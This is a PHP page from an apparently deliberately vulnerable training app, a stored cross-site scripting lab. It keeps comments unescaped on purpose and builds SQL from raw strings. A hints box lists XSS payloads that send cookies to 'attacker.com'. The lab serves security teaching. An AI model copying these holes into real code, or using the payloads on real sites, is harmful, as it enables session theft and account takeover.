<?php
require_once 'config.php';

if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $comment = $_POST['comment'] ?? '';
    $username = $_SESSION['username'];
    
    // VULNERABLE: Stored XSS
    // User input is stored directly in database without sanitization
    // When displayed, it's not escaped either
    $query = "INSERT INTO comments (username, email, content, created_at) VALUES ('" . $username . "', 'user@dvwa.local', '" . addslashes($comment) . "', NOW())";
    
    if ($mysqli->query($query)) {
        $message = "Comment posted successfully!";
    } else {
        $message = "Error posting comment: " . $mysqli->error;
    }
}

// Check if there's a reset message from reset_db.php
if (isset($_SESSION['reset_message'])) {
    $message = $_SESSION['reset_message'];
    unset($_SESSION['reset_message']);
}

// Fetch all comments
$query = "SELECT username, content, created_at FROM comments ORDER BY created_at DESC LIMIT 20";
$result = $mysqli->query($query);
?>
<!DOCTYPE html>
<html>
<head>
    <title>DVWA - XSS Stored</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #fff;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
        }
        .back-link {
            color: #f00;
            text-decoration: none;
            margin-bottom: 20px;
            display: inline-block;
        }
        .back-link:hover {
            text-decoration: underline;
        }
        h1 {
            color: #f00;
        }
        .info-box {
            background-color: #222;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #f00;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        textarea {
            width: 100%;
            padding: 8px;
            box-sizing: border-box;
            background-color: #333;
            color: #fff;
            border: 1px solid #555;
            border-radius: 3px;
            min-height: 80px;
            font-family: Arial, sans-serif;
        }
        button {
            padding: 10px 20px;
            background-color: #f00;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        button:hover {
            background-color: #c00;
        }
        .message {
            background-color: #1a3a1a;
            color: #6b6;
            padding: 10px;
            border-radius: 3px;
            margin-bottom: 15px;
        }
        .comments {
            background-color: #222;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
        }
        .comment {
            background-color: #333;
            padding: 15px;
            border-radius: 3px;
            margin-bottom: 10px;
            border-left: 4px solid #555;
        }
        .comment-meta {
            color: #aaa;
            font-size: 12px;
            margin-bottom: 10px;
        }
        .comment-author {
            font-weight: bold;
            color: #f00;
        }
        .comment-content {
            color: #fff;
            word-wrap: break-word;
        }
        .hint {
            background-color: #1a3a1a;
            color: #6b6;
            padding: 10px;
            border-radius: 3px;
            margin-top: 10px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <a href="dashboard.php" class="back-link">← Back to Dashboard</a>
        
        <h1>XSS - Stored Lab</h1>
        
        <div class="info-box">
            <h2>Stored Cross-Site Scripting</h2>
            <p>Post comments that are stored in the database. Malicious scripts are executed when the page loads.</p>
        </div>
        
        <form method="POST" action="reset_db.php" style="margin-bottom: 20px;">
            <input type="hidden" name="page" value="xss_stored.php">
            <button type="submit" name="reset_db" style="background-color: #ff6600; padding: 8px 15px; font-size: 14px;">🔄 Reset Database</button>
        </form>
        
        <form method="POST">
            <div class="form-group">
                <label for="comment">Post a Comment</label>
                <textarea id="comment" name="comment" required></textarea>
            </div>
            <button type="submit">Post Comment</button>
        </form>
        
        <div class="hint">
            <strong>Exploitation Hints:</strong><br>
            • Try: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - Script will execute for every user viewing this page<br>
            • Try: <code>&lt;img src=x onerror="fetch('https://attacker.com/?cookie='+document.cookie)"&gt;</code> - Steal cookies<br>
            • Try: <code>&lt;svg onload="document.location='https://attacker.com/?cookie='+document.cookie"&gt;</code> - Redirect with data theft
        </div>
        
        <?php if ($message): ?>
            <div class="message"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>
        
        <div class="comments">
            <h3>Comments (<?php echo $result->num_rows; ?>)</h3>
            <?php if ($result->num_rows > 0): ?>
                <?php while ($row = $result->fetch_assoc()): ?>
                    <div class="comment">
                        <div class="comment-meta">
                            <span class="comment-author"><?php echo htmlspecialchars($row['username']); ?></span>
                            - <?php echo htmlspecialchars($row['created_at']); ?>
                        </div>
                        <div class="comment-content">
                            <?php echo $row['content']; ?>
                        </div>
                    </div>
                <?php endwhile; ?>
            <?php else: ?>
                <p style="color: #aaa;">No comments yet. Be the first to post!</p>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>
